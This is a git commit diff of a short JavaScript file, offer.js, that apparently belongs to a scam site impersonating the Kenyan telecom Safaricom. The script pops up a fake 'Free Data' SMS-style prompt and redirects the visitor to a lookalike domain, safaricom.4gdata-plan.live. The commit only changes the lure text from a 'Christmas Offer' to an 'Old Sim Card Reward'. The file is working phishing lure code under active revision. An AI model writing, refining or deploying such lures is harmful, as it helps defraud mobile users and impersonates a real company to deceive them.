0e497020daa8a9f4feaf7274d93acb634f41f8ce
KENNY <examtapz+me@gmail.com>
2026-01-18 06:41:25 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,7 +1,8 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '25GB DATA'
-password=prompt('SMS: Welcome to Safaricom 25GB Free Data Christmas Offer, Kindly Press OK to ACTIVATE ','25GB DATA');
+password=prompt('SMS: Welcome to Safaricom 25GB Free Data Old Sim Card Reward, Kindly Press OK to ACTIVATE ','25GB DATA');
 if (password != '25GB DATA') {
 location.href='https://safaricom.4gdata-plan.live/25GB';
 
 }
+
